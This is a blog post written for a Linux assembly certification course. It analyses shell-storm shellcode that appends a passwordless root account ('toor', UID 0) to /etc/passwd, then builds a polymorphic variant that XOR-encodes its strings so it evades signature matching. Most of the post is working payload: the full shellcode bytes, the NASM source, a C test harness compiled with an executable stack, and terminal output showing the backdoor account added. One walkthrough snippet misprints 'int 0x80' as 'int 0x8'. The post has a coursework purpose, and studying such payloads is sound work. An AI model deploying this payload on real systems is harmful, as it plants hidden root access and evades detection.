Title: SLAE32 - Assignment 6.2
Date: 2022-06-04T14:09:03.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: PA-30398</p><h2 id="foreword">Foreword</h2><p>For this assignment, I chose the following shellcodes:</p><!--kg-card-begin: markdown--><ol>
<li><a href="http://shell-storm.org/shellcode/files/shellcode-812.php">Linux/x86 - chmod 666 /etc/passwd &amp; /etc/shadow - 57 bytes</a></li>
<li><a href="http://shell-storm.org/shellcode/files/shellcode-561.php">Linux/x86 - append /etc/passwd &amp; exit() - 107 bytes</a></li>
<li><a href="http://shell-storm.org/shellcode/files/shellcode-825.php">Linux/x86 - iptables --flush - 43 bytes</a></li>
</ol>
<!--kg-card-end: markdown--><p>In this part I'll create a polymorphic version of the second shellcode.</p><h2 id="source-code">Source Code</h2><!--kg-card-begin: markdown--><p>The files for this part of the assignment are the following:</p>
<ul>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/2/original_shellcode.nasm">original_shellcode.nasm</a>, the original shellcode from Shell-Storm</li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/2/polymorphic_shellcode.nasm">polymorphic_shellcode.nasm</a>, my polymorphic version of the shellcode above</li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/2/test_polymorphic_shellcode.c">test_polymorphic_shellcode.c</a>, a C program for testing the polymorphic shellcode</li>
</ul>
<!--kg-card-end: markdown--><h2 id="analysis">Analysis</h2><p>First, we need to analyze the original shellcode:</p><pre><code class="language-bash">echo -n "\xeb\x38\x5e\x31\xc0\x88\x46\x0b\x88\x46\x2b\xc6\x46\x2a\x0a\x8d\x5e\x0c\x89\x5e\x2c\x8d\x1e\x66\xb9\x42\x04\x66\xba\xa4\x01\xb0\x05\xcd\x80\x89\xc3\x31\xd2\x8b\x4e\x2c\xb2\x1f\xb0\x04\xcd\x80\xb0\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xc3\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x23\x74\x6f\x6f\x72\x3a\x3a\x30\x3a\x30\x3a\x74\x30\x30\x72\x3a\x2f\x72\x6f\x6f\x74\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x23" &gt; shellcode.bin

ndisasm -b 32 -p intel shellcode.bin
</code></pre><p>Follows the output of <code>ndisasm</code>:</p><pre><code class="language-nasm">                            ; Use the JMP-CALL-POP technique get a pointer to the string starting from address
                            ;   0000003A and ending at 00000069
                            ; the string is: /etc/passwd#toor::0:0:t00r:/root:/bin/bash #
00000000  EB38              jmp short 0x3a
00000002  5E                pop esi

                            ; clear the EAX register
00000003  31C0              xor eax,eax

                            ; replace the '#' character after '/etc/passwd'
                            ;   with a NULL byte
00000005  88460B            mov [esi+0xb],al

                            ; replace the '#' character after '/bin/bash '
                            ;   with a NULL byte
00000008  88462B            mov [esi+0x2b],al

                            ; replace the space after '/bin/bash'
                            ;   with a Line Feed (0x0a)
0000000B  C6462A0A          mov byte [esi+0x2a],0xa

                            ; store the pointer to 'toor::0:0:t00r:/root:/bin/bash'
                            ;   into EBX
0000000F  8D5E0C            lea ebx,[esi+0xc]

                            ; save the previous pointer after the following string:
                            ;   'toor::0:0:t00r:/root:/bin/bash\x0a\x00'
00000012  895E2C            mov [esi+0x2c],ebx

                            ; copy ESI into EBX
                            ;   it's pointing to the string "/etc/passwd"
00000015  8D1E              lea ebx,[esi]

                            ; 2nd argument of open():
                            ;   flags applied when opening the file:
                            ;     - O_APPEND
                            ;     - O_CREAT
                            ;     - O_RDWR
00000017  66B94204          mov cx,0x442

                            ; 3rd argument of open():
                            ;   mode (mode bits applied when a new file is created):
                            ;     - S_IRUSR
                            ;     - S_IWUSR
                            ;     - S_IRGRP
                            ;     - S_IROTH
0000001B  66BAA401          mov dx,0x1a4
</code></pre><p>I've learning something new while analyzing this shellcode: that permissions bits in the Linux kernel's source code are represented with the <a href="https://en.wikipedia.org/wiki/Octal">octal numeral system</a>.</p><p>Let's look at an example. If you were to check the values for a constant like <code>O_CREAT</code> in the file <code>/include/uapi/asm-generic/fcntl.h</code>, you would find something like this:</p><pre><code class="language-cpp">#define O_ACCMODE       00000003
#define O_RDONLY        00000000
#define O_WRONLY        00000001
#define O_RDWR          00000002

#ifndef O_CREAT
#define O_CREAT         00000100        /* not fcntl */
</code></pre><p>Initially I though the number was simply a decimal one. If not, maybe a hexadecimal number. Well, turns out that it's actually an octal one.</p><p>So you need to convert the number from octal to hex (or decimal when writing your shellcode).</p><p>Another piece of advice. When using <code>strace</code>, you can pass the arguments <code>-e raw=open</code> to view the original, raw values, instead of the constants names.</p><p>Back to the shellcode: after the instructions above, the <code>open</code> syscall is called.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">                            ; invoke syscall open()
0000001F  B005              mov al,0x5
00000021  CD80              int 0x80
</code></pre><figcaption>Use the <code>open()</code> syscall to open the file <code>/etc/passwd</code>, with flags</figcaption></figure><p>Now that the file is opened, it's time to write the new entry:</p><pre><code class="language-nasm">                            ; 1st argument of write():
                            ;   file descriptor of the file want to write
00000023  89C3              mov ebx,eax
00000025  31D2              xor edx,edx

                            ; 2nd argument of write():
                            ;   pointer to the buffer containing the bytes to write
00000027  8B4E2C            mov ecx,[esi+0x2c]

                            ; 3rd argument of write():
                            ;   number of bytes to write: 31
0000002A  B21F              mov dl,0x1f

                            ; call syscall: write()
0000002C  B004              mov al,0x4
0000002E  CD80              int 0x80

                            ; call syscall: close()
00000030  B006              mov al,0x6
00000032  CD80              int 0x80

                            ; call syscall: exit()
00000034  B001              mov al,0x1
00000036  31DB              xor ebx,ebx
00000038  CD80              int 0x80

                            ; part of the JMP-CALL-POP technique
                            ; go back to the address 0x00000002
0000003A  E8C3FFFFFF        call 0x2

                            ; two strings referenced by the previous instructions
0000003F  2F                das
...       ...               ...
00000069  2023              and [ebx],ah
</code></pre><h2 id="polymorphic-shellcode">Polymorphic shellcode</h2><p>Follows the polymorphic version of the shellcode:</p><pre><code class="language-nasm">; Author: Robert C. Raducioiu (rbct)
; Reference: http://shell-storm.org/shellcode/files/shellcode-561.php
; Shellcode: "\xeb\x48\x5f\x89\xfe\x31\xc9\xf7\xe1\xb1\x0b\x81\x37\x71\x63\x63\x75\x83\xc7\x04\xe2\xf5\x89\xf7\x89\xfb\x83\xc3\x0c\x53\x5e\x57\x5b\xb0\x06\x48\xb2\x69\xc1\xc2\x02\x66\xb9\x43\x04\x49\xcd\x80\x93\x31\xc0\x50\x5a\x6a\x20\x5a\x4a\x6a\x03\x58\x40\x56\x59\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x40\xcd\x80\xe8\xb3\xff\xff\xff\x5e\x06\x17\x16\x5e\x13\x02\x06\x02\x14\x07\x75\x05\x0c\x0c\x07\x4b\x59\x53\x4f\x41\x59\x17\x45\x41\x11\x59\x5a\x03\x0c\x0c\x01\x4b\x4c\x01\x1c\x1f\x4c\x01\x14\x02\x0b\x69\x75"
; Length: 123 bytes

global _start

section .text

_start:

    jmp short CallRunShellcode

RunShellcode:

    pop edi
    mov esi, edi

    xor ecx, ecx
    mul ecx

    mov cl, 11
    
DecodeStringBytes:
    
    xor DWORD [edi], 0x75636371

    add edi, 0x4
    loop DecodeStringBytes

OpenFile:

    mov edi, esi

    mov ebx, edi
    add ebx, 0xc

    push ebx
    pop esi

    push edi
    pop ebx

    mov al,0x6
    dec eax

    mov dl, 0x69
    rol edx, 2

    mov cx,0x443
    dec ecx

    int 0x80

AddMaliciousUser:

    xchg ebx,eax
    xor eax, eax

    push eax
    pop edx

    push 0x20
    pop edx
    dec edx

    push 0x3
    pop eax
    inc eax

    push esi
    pop ecx

    int 0x80

CloseFileHandle:

    xor eax, eax
    mov al,0x6
    int 0x80

Exit:

    inc eax
    int 0x80

CallRunShellcode:

    call RunShellcode
    EncodedStringBytes: db 0x5e,0x06,0x17,0x16,0x5e,0x13,0x02,0x06,0x02,0x14,0x07,0x75,0x05,0x0c,0x0c,0x07,0x4b,0x59,0x53,0x4f,0x41,0x59,0x17,0x45,0x41,0x11,0x59,0x5a,0x03,0x0c,0x0c,0x01,0x4b,0x4c,0x01,0x1c,0x1f,0x4c,0x01,0x14,0x02,0x0b,0x69,0x75
</code></pre><p>The size of the resulting shellcode is <code>123 bytes</code>, which means <code>115%</code> compared to the original shellcode.</p><p>Since the majority of the bytes are completely different (e.g. the strings <code>/etc/passwd</code> and the new line added to the former), I think this is a good compromise.</p><h3 id="analysis-1">Analysis</h3><p>Let's analyze the first two routines of the polymorphic shellcode:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">_start:

    jmp short CallRunShellcode

RunShellcode:

    pop edi
    mov esi, edi

    xor ecx, ecx
    mul ecx

    mov cl, 11
    
    ; ...

</code></pre><figcaption>The assembly code in between has been omitted for clarity, in order to show the <code>JMP-CALL-POP</code> technique</figcaption></figure><pre><code class="language-nasm">    ; ...

CallRunShellcode:

    call RunShellcode
    EncodedStringBytes: db 0x5e,0x06,0x17,0x16,0x5e,0x13,0x02,0x06,0x02,0x14,0x07,0x75,0x05,0x0c,0x0c,0x07,0x4b,0x59,0x53,0x4f,0x41,0x59,0x17,0x45,0x41,0x11,0x59,0x5a,0x03,0x0c,0x0c,0x01,0x4b,0x4c,0x01,0x1c,0x1f,0x4c,0x01,0x14,0x02,0x0b,0x69,0x75
</code></pre><p>Compared to the original shellcode, I'm still using the the <code>JMP-CALL-POP</code> technique.</p><p>I decided against pushing all the bytes 4 <code>DWORD</code> values at a time, as that would require way more bytes (considering the <code>XOR</code> operations too).</p><p>I'm saving the pointer to the bytes referenced by <code>EncodedStringBytes</code> into the register <code>EDI</code> instead of <code>ESI</code>, in order to change the resulting bytes.</p><p>However, I had to use the register <code>ESI</code> too, because I would later use <code>EDX</code> for decoding the <code>XOR</code>-ed bytes.</p><p>The other instructions (<code>xor</code>, <code>mul</code>, and <code>mov</code>) weren't present in the original shellcode, but I needed them for the decoding stub.</p><p>Follows the next routine:</p><pre><code class="language-nasm">DecodeStringBytes:
    
    ; XOR key: uccq
    xor DWORD [edi], 0x75636371

    ; now that the 4 bytes are decoded, step to the next 4 bytes
    add edi, 0x4

    ; repeat 11 times, if ECX == 0 don't loop
    loop DecodeStringBytes
</code></pre><p>The goal of the code above is to decode the encoded bytes, by <code>XOR</code>-ing one <code>DWORD</code> at a time with the key <code>0x75636371</code>.</p><p>It doesn't hold any special meaning, it's just 4 random bytes that don't generate any <code>NULL</code> bytes during the <code>XOR</code> operations.</p><p>The <code>loop</code> instruction, used in conjunction with <code>mov cl, 11</code> from above, allow the shellcode to repeat the routine <code>DecodeStringBytes</code> 11 times, in order to decode the <code>44 encoded bytes</code> referenced by the variable <code>EncodedStringBytes</code>.</p><p>Follows the next routine, named <code>OpenFile</code>:</p><pre><code class="language-nasm">OpenFile:

    ; restore EDI to the original value
    ;   (pointing to the start of the decoded bytes)
    mov edi, esi

    ; store the pointer to 'toor::0:0:t00r:/root:/bin/bash\0x0a' into ebx
    mov ebx, edi
    add ebx, 0xc

    ; save the same pointer into ESI too
    push ebx
    pop esi

    ; store the pointer to '/etc/passwd' into EBX
    push edi
    pop ebx

    ; store 0x5 into EAX (syscall: open())
    mov al,0x6
    dec eax

    ; store the WORD 0x1a4 into EDX
    mov dl, 0x69
    rol edx, 2

    ; store the WORD 0x442 into ECX
    mov cx,0x443
    dec ecx

    ; call syscall 0x5: open()
    int 0x80
</code></pre><p>The first instructions are used by the shellcode for retrieving the pointers to the following decoded strings:</p><ol><li>stored into the registers <code>EBX</code> and <code>EDI</code>: <code>/etc/passwd</code></li><li>stored into the register <code>ESI</code>: <code>toor::0:0:t00r:/root:/bin/bash</code> (plus <code>0xa</code> at the end)</li></ol><p>Compared to the original shellcode, I tried to restrict myself from directly moving bytes into registers, but instead using the <code>PUSH-POP</code> technique, as it requires the same number of bytes from what I've seen so far.</p><p>Moreover, I didn't want to use hard-coded values (<code>0x1a4</code> and <code>0x442</code>), so I simply used <code>DEC</code> and <code>ROL</code> to calculate the original values.</p><p>Next, there's the routing <code>AddMaliciousUser</code>, which appends the string <code>toor::0:0:t00r:/root:/bin/bash</code> to the previously-opened file, i.e. <code>/etc/passwd</code>:</p><pre><code class="language-nasm">AddMaliciousUser:

    ; exchange EBX with EAX in order to save the
    ;   file descriptor of the file opened
    xchg ebx,eax

    ; clear EAX for later use
    xor eax, eax
    push eax
    pop edx

    ; save the DWORD 0x0000001f into EDX
    push 0x20
    pop edx
    dec edx

    ; save the DWORD 0x00000004 into EAX
    push 0x3
    pop eax
    inc eax

    ; get the pointer to `toor::0:0:t00r:/root:/bin/bash`
    ;   and save it into ECX
    push esi
    pop ecx

    ; call syscall write()
    int 0x80
</code></pre><p>Starting from the top, instead of using <code>mov ebx, eax</code> I chose to use an instruction I've rarely used up until now: <code>XCHG</code>, which exchanges the contents of the two registers.</p><p>Next, I've used the instruction <code>XOR</code>, <code>PUSH</code>, and <code>POP</code> in order to clear <code>EDX</code> and <code>EAX</code>.</p><p>Compared to the original shellcode, which simply clears <code>EDX</code> by means of the instruction <code>xor edx, edx</code>, mine clears <code>EAX</code> too, in order to avoid errors caused by the return value of <code>open()</code>.</p><p>Moreover, to make the shellcode more polymorphic and evade pattern matching, I used the <code>PUSH-POP</code> technique to set the desired values into the registers.</p><p>Below is the second-to-last Assembly routine:</p><pre><code class="language-nasm">CloseFileHandle:

    xor eax, eax

    ; call syscall close()
    mov al,0x6
    int 0x8
</code></pre><p>It closes the file descriptor of the file <code>/etc/passwd</code>, opened before by means of the syscall <code>open()</code>.</p><p>As before, I've explicitly cleared the <code>EAX</code> register in order to make the shellcode more stable. The rest is the same as the original shellcode.</p><p>Finally, the last routine:</p><pre><code class="language-nasm">Exit:

    ; call syscall exit() 
    inc eax
    int 0x80
</code></pre><p>It terminates the execution.</p><p>I chose not to clear <code>EAX</code> in order to save more bytes, but since this polymorphic version is simply <code>115%</code> bigger than the original size, you can just add a <code>xor eax, eax</code> before the <code>inc eax</code>, since it required only <code>1 byte</code>.</p><h3 id="testing">Testing</h3><p>To test the polymorphic shellcode, I've used the following C program:</p><pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

unsigned char code[] = \
"\xeb\x48\x5f\x89\xfe\x31\xc9\xf7\xe1\xb1\x0b\x81\x37\x71\x63\x63\x75\x83\xc7\x04\xe2\xf5\x89\xf7\x89\xfb\x83\xc3\x0c\x53\x5e\x57\x5b\xb0\x06\x48\xb2\x69\xc1\xc2\x02\x66\xb9\x43\x04\x49\xcd\x80\x93\x31\xc0\x50\x5a\x6a\x20\x5a\x4a\x6a\x03\x58\x40\x56\x59\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x40\xcd\x80\xe8\xb3\xff\xff\xff\x5e\x06\x17\x16\x5e\x13\x02\x06\x02\x14\x07\x75\x05\x0c\x0c\x07\x4b\x59\x53\x4f\x41\x59\x17\x45\x41\x11\x59\x5a\x03\x0c\x0c\x01\x4b\x4c\x01\x1c\x1f\x4c\x01\x14\x02\x0b\x69\x75";

main()
{
    printf("Shellcode length: %d\n", strlen(code));

    int (*ret)() = (int(*)())code;
    ret();
}
</code></pre><p>To compile:</p><pre><code class="language-bash">gcc -fno-stack-protector -z execstack -o test_polymorphic_shellcode test_polymorphic_shellcode.c
</code></pre><p>Once I've run it, I could see a new entry inside the file <code>/etc/passwd</code>:</p><pre><code class="language-bash">rbct@slae:~/exam/assignment_6/2$ tail -n 3 /etc/passwd
# landscape:x:104:109::/var/lib/landscape:/bin/false
# sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
# rbct:x:1000:1000:rbct,,,:/home/rbct:/bin/bash

rbct@slae:~/exam/assignment_6/2$ sudo ./shellcode_template 
# Shellcode length: 123

rbct@slae:~/exam/assignment_6/2$ tail -n 3 /etc/passwd
# sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
# rbct:x:1000:1000:rbct,,,:/home/rbct:/bin/bash
# toor::0:0:t00r:/root:/bin/bash

rbct@slae:~/exam/assignment_6/2$ 
</code></pre>